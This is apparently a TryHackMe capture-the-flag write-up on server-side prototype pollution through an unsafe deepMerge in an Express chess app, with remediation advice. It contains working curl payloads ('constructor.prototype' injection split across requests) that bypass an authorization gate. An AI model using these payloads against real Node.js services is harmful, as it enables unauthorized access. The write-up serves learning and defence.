# TryHackMe — Fools Mate, Revenge

> **Prototype Pollution via Unsafe Deep Merge in an Express Chess Application**

| Detail | Value |
|---|---|
| **Platform** | [TryHackMe](https://tryhackme.com) |
| **Room** | Fools Mate, Revenge |
| **Difficulty** | Medium |
| **Category** | Web Exploitation |
| **Key Vulnerability** | Prototype Pollution (CWE-1321) |
| **Related CWEs** | CWE-915 (Mass Assignment), CWE-209 (Information Disclosure via Error) |
| **Tech Stack** | Node.js, Express, chess.js |
| **Flag** | `THM{pr0t0_p0llut██████████████}` |

---

## Table of Contents

1. [Overview](#overview)
2. [Reconnaissance](#reconnaissance)
3. [Application Analysis](#application-analysis)
4. [Identifying the Vulnerability](#identifying-the-vulnerability)
5. [Exploitation — Prototype Pollution](#exploitation--prototype-pollution)
6. [Why It Works — The Prototype Chain Walk](#why-it-works--the-prototype-chain-walk)
7. [Remediation](#remediation)
8. [Lessons Learned](#lessons-learned)
9. [References](#references)

---

## Overview

"Fools Mate, Revenge" presents a polished chess web application — an **Endgame Trainer** — that challenges the player to deliver checkmate in one move. The puzzle itself is trivial (Rook to a8 is an obvious back-rank mate), but the application refuses to give you the flag when you solve it legitimately: a server-side "reward gate" checks a session property that is never set through normal gameplay.

The intended attack vector is **Server-Side Prototype Pollution** via an unprotected `deepMerge()` function in the `/api/settings` endpoint. By injecting properties through JavaScript's prototype chain, we can make the reward gate's authorization check resolve to `true` without ever directly setting the guarded property.

---

## Reconnaissance

### Initial Fingerprinting

```bash
curl -I http://TARGET:3000
```

```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=UTF-8
```

The `X-Powered-By: Express` header immediately identifies a **Node.js / Express** backend. No additional headers suggest security hardening (no `X-Frame-Options`, no `Strict-Transport-Security`).

### Static Asset Enumeration

The HTML source reveals the client-side architecture:

```html
<script type="module" src="js/app.js"></script>
<link rel="stylesheet" href="css/styles.css" />
```

Notable HTML elements:

- A `flagBanner` div with `hidden` attribute — the flag display container
- A modal dialog styled as a **Windows 2000 error window** with the suspicious title `/usr/lib32` — the "locked" notification
- References to `vendor/chess.js` — the chess engine library

---

## Application Analysis

### API Surface Discovery

By reading `js/app.js`, four API endpoints are identified:

| Endpoint | Method | Purpose |
|---|---|---|
| `/api/state` | GET | Returns current game state (FEN, status, turn) |
| `/api/reset` | POST | Resets the board to the starting position |
| `/api/move` | POST | Submits a move `{from, to, promotion}` |
| `/api/settings` | POST | Saves user preferences `{theme, pieceSet, animationMs}` |

### The Chess Puzzle

The starting position in FEN notation:

```
6k1/5ppp/8/8/8/8/5PPP/R5K1 w - - 0 1
```

This is a straightforward **mate-in-one**: the White Rook on a1 moves to a8, delivering back-rank checkmate. The Black King on g8 is trapped behind its own pawns on f7, g7, and h7.

### The Reward Gate

Solving the puzzle normally:

```bash
curl -s -X POST http://TARGET:3000/api/move \
  -H 'Content-Type: application/json' \
  -d '{"from":"a1","to":"a8"}'
```

```json
{
  "ok": true,
  "status": "checkmate",
  "winner": "white",
  "locked": true,
  "message": "Checkmate! No reward for you.",
  "reason": "reward gate closed: session.config.unlocked is not set"
}
```

The server explicitly tells us the condition: **`session.config.unlocked` must be truthy**. This property is never set during normal gameplay — there is no legitimate code path that populates it.

---

## Identifying the Vulnerability

### Probing `/api/settings`

The `savePrefs()` function in `app.js` sends arbitrary JSON to `/api/settings`:

```javascript
const res = await fetch('/api/settings', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(prefs)
});
```

The server performs a **deep merge** of the incoming body into the session object. Sending non-standard keys reveals whether input validation exists:

```bash
curl -si -X POST http://TARGET:3000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"config":{"unlocked":true}}'
```

```
HTTP/1.1 500 Internal Server Error

RangeError: Maximum call stack size exceeded
    at deepMerge (/opt/ctf/chess-e2/server.js:28:19)
    at deepMerge (/opt/ctf/chess-e2/server.js:33:7)
    ...
```

This error trace is gold — it reveals:

1. **The server uses a custom `deepMerge()` function** (line 28-33 of `server.js`)
2. **The merge is recursive with no cycle detection** — it enters infinite recursion on circular references
3. **The server path** is `/opt/ctf/chess-e2/server.js` (CWE-209: Information Disclosure via Error Message)
4. **There is no whitelist** on accepted properties — any key in the JSON body gets merged

### Testing Prototype Pollution Vectors

**`__proto__` vector:**

```bash
curl -s -X POST http://TARGET:3000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"config":{"unlocked":true}}}'
```

Result: `500 Internal Server Error` — same stack overflow. The `__proto__` key is parsed by `JSON.parse()` as a regular property in this Node.js version, and `deepMerge` follows it into `Object.prototype`, which contains circular refs like `constructor.prototype → Object.prototype`.

**`constructor.prototype` with primitive value:**

```bash
curl -s -X POST http://TARGET:3000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"config":true}}}'
```

Result: **`200 OK`** — the merge traverses `session.constructor` → `Object` → `Object.prototype`, and assigns `config = true`. Since `true` is a primitive, `deepMerge` doesn't recurse into it — no stack overflow.

**`constructor.prototype` with object value:**

```bash
curl -s -X POST http://TARGET:3000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"unlocked":true}}}'
```

Result: `500 Internal Server Error` — BUT the primitive `unlocked = true` is **written before the crash**. The assignment `Object.prototype.unlocked = true` executes before `deepMerge` attempts to recurse deeper into the already-polluted prototype and hits the circular reference.

---

## Exploitation — Prototype Pollution

### The Two-Step Attack

The key insight is that we need **two properties** on `Object.prototype`, and nested objects cause crashes. Solution: **split the pollution across two requests**, each injecting a single primitive.

**Step 1 — Pollute `Object.prototype.unlocked`:**

```bash
# Initialize session with cookie persistence
curl -s -c /tmp/c.jar -X POST http://TARGET:3000/api/reset > /dev/null

# This crashes (500) but the primitive write executes BEFORE the crash
curl -s -b /tmp/c.jar -c /tmp/c.jar \
  -X POST http://TARGET:3000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"unlocked":true}}}'
```

After this request: `Object.prototype.unlocked = true` ✓ (despite the 500 response)

**Step 2 — Pollute `Object.prototype.config`:**

```bash
# Primitive value — no recursion, no crash, 200 OK
curl -s -b /tmp/c.jar -c /tmp/c.jar \
  -X POST http://TARGET:3000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"config":true}}}'
```

After this request: `Object.prototype.config = true` ✓

**Step 3 — Deliver checkmate and claim the flag:**

```bash
curl -s -b /tmp/c.jar -c /tmp/c.jar \
  -X POST http://TARGET:3000/api/move \
  -H 'Content-Type: application/json' \
  -d '{"from":"a1","to":"a8"}'
```

```json
{
  "ok": true,
  "status": "checkmate",
  "winner": "white",
  "flag": "THM{pr0t0_p0llut██████████████}"
}
```

---

## Why It Works — The Prototype Chain Walk

The server's reward gate check is conceptually:

```javascript
if (session.config && session.config.unlocked) {
  // return flag
}
```

After pollution, here's what JavaScript's property resolution does:

```
session.config
  → session has no own property "config"
  → walk prototype chain: session.__proto__ = Object.prototype
  → Object.prototype.config = true   ← WE SET THIS
  → returns true (truthy ✓)

true.unlocked
  → true is a primitive, JS auto-boxes to Boolean object
  → Boolean has no own property "unlocked"
  → walk prototype chain: Boolean.prototype.__proto__ = Object.prototype
  → Object.prototype.unlocked = true   ← WE SET THIS
  → returns true (truthy ✓)

Both checks pass → flag is returned
```

The elegance of this attack is that we never touch `session` directly. We pollute `Object.prototype` — the root ancestor of all JavaScript objects — so that **every object in the process** now has `config` and `unlocked` in its prototype chain.

### Why Crashes Don't Prevent the Write

The `deepMerge()` function processes properties iteratively. When it encounters `constructor.prototype.unlocked = true`:

1. It navigates to `session.constructor` → `Object`
2. It navigates to `Object.prototype`
3. It assigns `Object.prototype.unlocked = true` (primitive → direct write)
4. It then tries to reconcile the rest of `Object.prototype` with the source object → hits circular references → **crash**

Step 3 completes **before** step 4 crashes. The Node.js process catches the error (Express error handler), but `Object.prototype` is already mutated — prototype pollution is not transactional.

---

## Remediation

### For This Application

1. **Whitelist accepted properties** in `/api/settings`:
   ```javascript
   const ALLOWED = ['theme', 'pieceSet', 'animationMs'];
   const safe = {};
   for (const k of ALLOWED) {
     if (k in req.body) safe[k] = req.body[k];
   }
   Object.assign(session.preferences, safe);
   ```

2. **Sanitize dangerous keys** in `deepMerge`:
   ```javascript
   const BLOCKED = new Set(['__proto__', 'constructor', 'prototype']);
   function deepMerge(target, source) {
     for (const key of Object.keys(source)) {
       if (BLOCKED.has(key)) continue;
       // ...
     }
   }
   ```

3. **Disable error stack traces in production** — the leaked path and function name directly aided exploitation:
   ```javascript
   app.set('env', 'production');
   // or custom error handler that strips stack traces
   ```

### General Guidance

- Replace custom `deepMerge` with a safe alternative (e.g., `lodash.merge` post-CVE-2019-10744 fix, or structured clone)
- Use `Object.create(null)` for session data objects (no prototype chain to pollute)
- Apply `--frozen-intrinsics` flag in Node.js to freeze `Object.prototype`
- Never derive authorization state from objects that share the global prototype

---

## Lessons Learned

1. **Crash ≠ failure.** A 500 response from `deepMerge` does not mean the write didn't happen. JavaScript prototype mutations are immediate and non-transactional — the side-effect persists even when the function that caused it throws.

2. **Split nested payloads into primitive-only steps.** When a recursive merge crashes on objects, decompose the attack: inject each level of the target path as a separate primitive value across multiple requests.

3. **Error messages are recon gold.** The stack trace revealed the exact function name (`deepMerge`), its location (`server.js:28`), and the server's filesystem path — all of which confirmed the vulnerability class before exploitation.

4. **The `constructor.prototype` path bypasses `__proto__` filters.** Many frameworks strip `__proto__` from JSON input but forget that `obj.constructor.prototype === Object.prototype` provides an equivalent traversal path. Both must be blocked.

5. **The `reason` field was an unintentional hint.** The server returned `"reason": "reward gate closed: session.config.unlocked is not set"` — literally telling the attacker which property path to pollute. Detailed error reasons should never be exposed to clients.

---

## References

- [CWE-1321: Improperly Controlled Modification of Object Prototype Attributes](https://cwe.mitre.org/data/definitions/1321.html)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [CWE-209: Generation of Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/209.html)
- [CVE-2019-10744 — lodash Prototype Pollution](https://nvd.nist.gov/vuln/detail/CVE-2019-10744)
- [HackTricks: Prototype Pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)
- [OWASP: Mass Assignment](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
